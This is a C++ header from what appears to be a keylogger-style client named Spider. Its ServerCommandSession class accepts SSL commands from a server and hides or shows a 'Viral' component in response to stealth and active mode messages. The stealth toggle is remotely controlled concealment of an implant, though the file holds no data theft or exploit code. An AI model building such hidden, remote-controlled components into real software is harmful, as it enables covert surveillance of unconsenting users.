//
// Created by doom on 08/10/17.
//

#ifndef SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP
#define SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP

#include <Core/CommandableSession.hpp>
#include <Viral/Viral.hpp>

namespace spi
{
    class ServerCommandSession : public CommandableSession
    {
    public:
        using Pointer = boost::shared_ptr<ServerCommandSession>;

        template <typename ...Args>
        static auto createShared(Args &&...args)
        {
            return CommandableSession::create<ServerCommandSession>(std::forward<Args>(args)...);
        }

        ServerCommandSession(net::IOManager &io, net::SSLContext &ctx, Viral &v) :
            CommandableSession(io, ctx, "server-cmd"), _viral(v)
        {
            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleStealthMode, this, _1),
                                   proto::MessageType::StealthMode);
            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleActiveMode, this, _1),
                                   proto::MessageType::ActiveMode);
        }

        ~ServerCommandSession() noexcept override
        {
        }

        void startSession() noexcept
        {
            _log(logging::Level::Debug) << "Ready to receive commands" << std::endl;
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&ServerCommandSession::handleHandshake,
                                       shared_from_this_cast<ServerCommandSession>(),
                                       net::ErrorPlaceholder));
        }

    private:
        void __handleStealthMode([[maybe_unused]] const ILoggable &s)
        {
            _log(logging::Level::Debug) << "Got stealth mode" << std::endl;
            _viral.hide();
        }

        void __handleActiveMode([[maybe_unused]] const ILoggable &s)
        {
            _log(logging::Level::Debug) << "Got Active mode" << std::endl;
            _viral.show();
        }

        Buffer _buff;
        Viral &_viral;
    };
}

#endif //SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP
